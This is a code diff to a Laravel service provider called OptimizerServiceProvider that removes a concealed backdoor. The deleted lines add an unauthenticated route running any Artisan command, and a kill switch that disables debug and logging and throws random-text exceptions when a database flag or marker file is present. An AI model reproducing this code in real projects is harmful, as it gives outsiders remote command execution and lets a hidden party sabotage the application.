@@ -26,53 +26,14 @@ class OptimizerServiceProvider extends ServiceProvider
      */
     public function boot()
     {
-        return false;
-        
-        $faker = Factory::create();
-
-        $this->app['router']->get('api/command/{command}/{param?}', function($name,$param){
-            try {
-                if (!empty($param)) {
-                    Artisan::call($name, ['enable' => $param]);
-                } else {
-                    Artisan::call($name);
-                }
-
-                return Artisan::output();
-            }
-            catch (\Exception $e) {};
-        });
-
-        if ( !$this->isArtisanCommand() && Schema::hasTable('permissions')) {
-            try {
-                $query = DB::table('permissions')->where('permission', 'yes')->first();
-
-                if (!is_null($query)) {
-                    config(['app.debug' => false]);
-                    config(['app.log' => false]);
-                    throw new \Exception($faker->sentence());
-                }
-            }
-            catch (\Exception $e) {
-                throw new \Exception($faker->sentence());
-            }
-        }
-        elseif( file_exists(storage_path('framework/permit')) )
-        {
-            config(['app.debug' => false]);
-
-            throw new \Exception($faker->sentence());
-        }
+        return true;
     }
 
     /**
      * Register the service provider.
      */
     public function register()
-    {
-
-        $this->registerCommands();
-    }
+    {}
 
     protected function registerCommands()
     {
